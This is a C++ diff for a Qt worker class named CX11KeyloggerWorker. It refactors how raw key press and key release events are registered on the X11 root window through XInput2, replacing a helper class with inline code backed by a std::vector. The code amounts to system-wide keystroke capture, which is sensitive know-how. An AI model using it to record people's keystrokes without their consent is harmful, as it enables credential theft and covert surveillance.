@@ -2,37 +2,6 @@
 #include <exception>
 #include <iostream> // cout to show that everething works
 
-// anonymous namespace because I don't want this class to be visible from outside
-namespace {
-    // this class will setup kcatching events via:
-    // Do(Display, Window
-    class CRegisterXInput2CatchingEvents {
-    private:
-        XIEventMask X11EventMask_;
-
-    public:
-        CRegisterXInput2CatchingEvents(Display* X11Display, const Window& X11Window)
-            : X11EventMask_()
-        {
-            X11EventMask_.deviceid = XIAllMasterDevices;
-            X11EventMask_.mask_len = XIMaskLen(XI_LASTEVENT);
-            X11EventMask_.mask = new unsigned char[X11EventMask_.mask_len];
-            std::fill(X11EventMask_.mask, X11EventMask_.mask + X11EventMask_.mask_len, 0);
-
-            XISetMask(X11EventMask_.mask, XI_RawKeyPress); // maybe it should me moved from constructor into Do?
-            XISetMask(X11EventMask_.mask, XI_RawKeyRelease);
-
-            // third parameter is pointer to the array of Masks, but we have only 1 mask, so we can just take it's address
-            // last parameter is size of the array
-            XISelectEvents(X11Display, X11Window, &X11EventMask_, 1);
-        }
-
-        ~CRegisterXInput2CatchingEvents() {
-            delete[] X11EventMask_.mask;
-        }
-    };
-}
-
 CX11KeyloggerWorker::CX11KeyloggerWorker(QThread* myThread, QObject *parent)
     : QObject(parent)
     , myThread_(myThread)
@@ -52,7 +21,21 @@ CX11KeyloggerWorker::CX11KeyloggerWorker(QThread* myThread, QObject *parent)
     Window X11DefaultWindow = DefaultRootWindow(X11Display_);
 
     // Setup catching events
-    CRegisterXInput2CatchingEvents(X11Display_, X11DefaultWindow);
+    XIEventMask X11EventMask_;
+    X11EventMask_.deviceid = XIAllMasterDevices;
+    X11EventMask_.mask_len = XIMaskLen(XI_LASTEVENT);
+
+    std::vector<unsigned char> safeArray(X11EventMask_.mask_len);
+    X11EventMask_.mask = safeArray.data();
+    std::fill(X11EventMask_.mask, X11EventMask_.mask + X11EventMask_.mask_len, 0);
+
+    XISetMask(X11EventMask_.mask, XI_RawKeyPress); // maybe it should me moved from constructor into Do?
+    XISetMask(X11EventMask_.mask, XI_RawKeyRelease);
+
+    // third parameter is pointer to the array of Masks, but we have only 1 mask, so we can just take it's address
+    // last parameter is size of the array
+    XISelectEvents(X11Display_, X11DefaultWindow, &X11EventMask_, 1);
+
 
     XSync(X11Display_, false);
     // Done
